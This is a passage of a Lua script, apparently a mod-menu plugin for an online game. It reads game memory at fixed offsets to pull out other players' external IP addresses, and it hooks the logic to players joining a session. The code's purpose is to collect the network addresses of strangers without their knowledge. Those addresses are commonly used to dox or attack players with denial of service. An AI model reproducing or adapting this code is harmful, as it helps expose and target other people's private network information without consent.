	for i = 3, 0, -1 do table.insert(fields, memory.read_ubyte(addr + i)) end
	return table.concat(fields, ".")
end

---@param player integer
---@return string? IP
function get_external_ip(player)
	local netPlayer = GetNetGamePlayer(player)
	if netPlayer == NULL then
		return nil
	end
	local CPlayerInfo = memory.read_long(netPlayer + 0xA0)
	if CPlayerInfo == NULL then
		return nil
	end
	local netPlayerData = CPlayerInfo + 0x20
	local netAddress = read_net_address(netPlayerData + 0x4C)
	return netAddress
end

players.on_join(player)
players.dispatch_on_join()

util.keep_running()